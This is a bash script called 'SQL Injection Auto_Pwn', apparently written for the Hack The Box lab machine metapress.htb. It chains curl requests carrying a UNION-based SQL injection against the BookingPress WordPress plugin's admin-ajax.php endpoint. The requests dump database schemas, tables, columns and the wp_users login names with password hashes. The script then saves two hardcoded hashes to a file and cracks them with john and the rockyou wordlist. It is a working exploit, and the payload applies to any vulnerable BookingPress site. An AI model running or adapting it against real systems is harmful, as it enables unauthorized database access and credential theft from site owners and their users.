#!/bin/bash

#colors
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
GRAY='\033[0;90m'
END='\033[0m'

function ctrl_c(){
  echo -e "\n\n${RED}[!] Saliendo...${END}"
  exit 1
}

trap ctrl_c INT


function banner(){
     

echo -e "\e[033m\e[0;36m ________               .__        ________      .___ \e[0m"
echo -e "\e[033m\e[0;36m \______ \_______  ____ |__|__  ___\_____  \   __| _/ \e[0m"
echo -e "\e[033m\e[0;36m |    |  \_  __ \/  _ \|  \  \/  /  _(__  <  / __ |  \e[0m"
echo -e "\e[033m\e[0;36m |    |   \   |    <_> )  |>    <  /       \/ /_/ |  \e[0m"
echo -e "\e[033m\e[0;36m /_______  /__|\____/|__/__/\___\/_/________/\____|  \e[0m"
echo -e "\e[033m\e[0;36m         \/                      \/       \/      \/   \e[0m"
                echo -e  "\t\t${PURPLE}   Created by ~${endColour}${PURPLE}Droix3d  ${endColour}\n"
                echo -e  "\t\t${WHITE}~${endColour}${YELLOW}SQL Injection Auto_Pwn${endColour}${WHITE}~${endColour}\n"
}

banner
echo -e "${RED}Vulnerability Detected in host http://metapress.htb${endColour} ${WHITE}->${endColour} BookingPress < 1.0.11 - Unauthenticated SQL Injection\n"
echo -e "${GREEN}\tExtract the "nonce" in the web site\n\n step 1. visit http://metapress.htb/events\n step 2. view source \n step 3. search and filter(CTRL + F) for bookingpress_before_book_appointment\n step 4. Copy and page your number wpnonce:'YOUR CODE'${endColour}\n"

echo -ne "\n${WHITE}Enter your code here >> ${endColour}" && read -r code
echo -e "\n${RED}[+]Generate SQL Injection...\n${endColour}"
sleep 2

echo -e "\n${RED}\t[!]Dump Database...${endColour}" ; tput civis
sleep 1.5
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&_wpnonce=$code&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(schema_name),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from information_schema.schemata-- -" | tail -n 2 | awk '{print $1}' | awk -F ":" '{print $2}' | tr -d '""' | tr ',' '\n'              
sleep 1

echo -e "\n${WHITE}\t[!]Dump Tables...${endColour}"
sleep 1.5
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&_wpnonce=$code&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(table_name),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from information_schema.tables where table_schema=0x626c6f67-- -" | tail -n 2 | awk '{print $1}' | awk -F ":" '{print $2}' | tr -d '""' | tr ',' '\n'
sleep 1

echo -e "\n${PURPLE}\t[!]Dump Columns...${endColour}"
sleep 1.5
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&_wpnonce=$code&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(column_name),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from information_schema.columns where table_schema=0x626c6f67 and table_name=0x77705f7573657273-- -" | tail -n 2 | awk '{print $1}' | awk -F ":" '{print $2}' | tr -d '""' | tr ',' '\n' 
sleep 1

echo -e "\n${CYAN}\t[!]Dump Credentials..."
sleep 1.5
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&_wpnonce=$code&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login,0x3a,user_pass),@@version_comment,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -" | tail -n 2 | awk '{print $1}' | tr ',' '\n' 
sleep 1

echo -e "\n${YELLOW}\t[!] Credentials Found [!]${endColour}"
sleep 0.5 
echo -e \n'admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV'
echo -e \n'manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70'
echo -e "\nSaving Passwords ..."
sleep 1
echo 'admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.' > hashes
echo 'manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' >> hashes
sleep 0.5
echo -e "\n\tHashes Cracking With John"
john --wordlist=/usr/share/wordlists/rockyou.txt hashes 

